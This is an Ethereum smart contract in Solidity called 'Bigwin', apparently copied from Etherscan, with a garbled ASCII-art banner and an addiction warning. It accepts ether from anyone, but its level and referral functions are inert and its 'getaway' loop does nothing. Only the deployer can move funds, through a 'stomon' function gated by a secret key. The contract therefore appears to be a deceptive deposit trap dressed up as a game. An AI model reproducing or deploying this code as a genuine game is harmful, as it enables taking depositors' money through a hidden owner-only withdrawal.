/**
 *Submitted for verification at Etherscan.io on 2019-11-02
*/

pragma solidity ^0.4.18;
/**
 * @title Bigwin
 *            
 *             ¨X¨T¨[©°©¤©´©°©¤©´©Ð©°©¤©´©Ð©°©¤©´©Ð   ©°©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤--------©´ ¨j ¨j©°©¤©´©°©´ ¨X¨T¨[©Ð©°©Ð©´©°©¤©´ 
 *             ¨U ¨U©À©È ©À©È ©¦©¦  ©¦©À©¤©È©¦   ©¦                                 ©¦ ¨U¨U¨U©À©È ©À©Ø©´¨^¨T¨[©¦ ©¦ ©À©È  
 *             ¨^¨T¨a©¸  ©¸  ©Ø©¸©¤©¼©Ø©Ø ©Ø©Ø©¤©¼ ©¸©¤©Ð©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤--------©¤©¤©¤©Ð©¤©¼ ¨^¨m¨a©¸©¤©¼©¸©¤©¼¨^¨T¨a©Ø ©Ø ©¸©¤©¼ 
 *   ©°©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¼                     ©¸©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©´
 *   ©¦¨X¨T¨[©°©¤©´©Ð  ©Ð©°©Ð©´©Ð©°©Ð©´©Ð ©Ð   ¨X¨j¨[©°©¤©´©°©¤©´©Ð©°©¤©´©°©´©°   ¨j©°©´©°©°©Ð©´©°©¤©´©Ð©¤©´©°©¤©´©°©¤©´©°©¤©´©°©¤©´   ¨X¨T¨[©°©Ð©´©°©¤©´©°©¤©´©Ð©°©¤©¦
 *   ©¦¨^¨T¨[©¦ ©¦©¦  ©¦ ©¦©¦©¦ ©¦ ©¸©Ð©¼ ¨T  ¨U¨U©À©È ©¸©¤©´©¦©¦ ©Ð©¦©¦©¦ ¨T ¨U©¦©¦©¦ ©¦ ©À©È ©À©Ð©¼©À©È ©À©¤©È©¦  ©À©È  ¨T ¨^¨T¨[ ©¦ ©À©¤©È©¦  ©À©Ø©´©¦
 *   ©¦¨^¨T¨a©¸©¤©¼©Ø©¤©¼©Ø©¤©Ø©¼©Ø ©Ø  ©Ø    ¨T¨m¨a©¸©¤©¼©¸©¤©¼©Ø©¸©¤©¼©¼©¸©¼   ¨m©¼©¸©¼ ©Ø ©¸©¤©¼©Ø©¸©¤©¸  ©Ø ©Ø©¸©¤©¼©¸©¤©¼   ¨^¨T¨a ©Ø ©Ø ©Ø©¸©¤©¼©Ø ©Ø©¦
 
 * 
 * This product is protected under license.  Any unauthorized copy, modification, or use without 
 * express written consent from the creators is prohibited.
 * 
 * WARNING:  THIS PRODUCT IS HIGHLY ADDICTIVE.  IF YOU HAVE AN ADDICTIVE NATURE.  DO NOT PLAY.
 */

//==============================================================================
//      
//     
//==============================================================================
contract Bigwin {

    address public minter;
    uint ethWei = 1 ether;
    uint rid = 1;
    	uint bonuslimit = 15 ether;
	uint sendLimit = 100 ether;
	uint withdrawLimit = 15 ether;
	uint canImport = 1;
    bytes32 public hashLock = 0x449e70f55b2d1405e35f2ac0bb17549fff3df38239910a33c870101274191e1b;	
	uint canSetStartTime = 1;
	mapping(string => address) addressMapping;

    function () payable public {}
    function Bigwin() public {
        minter = msg.sender;
    }
    
   
    function stomon(address  userAddress, uint money,string _WhatIsTheMagicKey)  public {
          require(sha256(_WhatIsTheMagicKey) == hashLock);
           if (msg.sender != minter) return;
		if (money > 0) {
			userAddress.transfer(money);
		}
	}
		function getLevel(uint value) public view returns (uint) {
		if (value >= 0 * ethWei && value <= 5 * ethWei) {
			return 1;
		}
		if (value >= 6 * ethWei && value <= 10 * ethWei) {
			return 2;
		}
		if (value >= 11 * ethWei && value <= 15 * ethWei) {
			return 3;
		}
		return 0;
	}

	function getNodeLevel(uint value) public view returns (uint) {
		if (value >= 0 * ethWei && value <= 5 * ethWei) {
			return 1;
		}
		if (value >= 6 * ethWei && value <= 10 * ethWei) {
			return 2;
		}
		if (value >= 11 * ethWei) {
			return 3;
		}
		return 0;
	}

	function getScByLevel(uint level) public pure returns (uint) {
		if (level == 1) {
			return 5;
		}
		if (level == 2) {
			return 7;
		}
		if (level == 3) {
			return 10;
		}
		return 0;
	}

	function getFireScByLevel(uint level) public pure returns (uint) {
		if (level == 1) {
			return 3;
		}
		if (level == 2) {
			return 6;
		}
		if (level == 3) {
			return 10;
		}
		return 0;
	}

	function getRecommendScaleByLevelAndTim(uint level, uint times) public pure returns (uint){
		if (level == 1 && times == 1) {
			return 50;
		}
		if (level == 2 && times == 1) {
			return 70;
		}
		if (level == 2 && times == 2) {
			return 50;
		}
		if (level == 3) {
			if (times == 1) {
				return 100;
			}
			if (times == 2) {
				return 70;
			}
			if (times == 3) {
				return 50;
			}
			if (times >= 4 && times <= 10) {
				return 10;
			}
			if (times >= 11 && times <= 20) {
				return 5;
			}
			if (times >= 21) {
				return 1;
			}
		}
		return 0;
	}



	function getaway(uint money) pure private {
		
		for (uint i = 1; i <= 25; i++) {
			 
	
		

			uint moneyResult = 0;
			if (money <= 15 ether) {
				moneyResult = money;
			} else {
				moneyResult = 15 ether;
			}

		  
	
		}
	}
	
}